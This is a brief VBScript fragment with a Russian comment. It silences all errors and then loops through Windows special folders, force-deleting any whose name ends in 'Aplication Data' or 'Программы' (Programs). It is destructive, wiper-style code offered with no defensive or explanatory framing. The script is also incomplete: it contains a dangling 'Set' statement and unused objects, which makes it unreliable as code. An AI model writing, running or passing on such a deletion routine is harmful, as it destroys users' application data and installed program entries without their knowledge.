Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set 

For Each Folder In Shell.SpecialFolders

 If right(folder,15) = "Aplication Data" Then FileSystemObject.deletefolder folder,True

 If right(folder,9) = "Программы" Then FileSystemObject.deletefolder folder,True
 Next

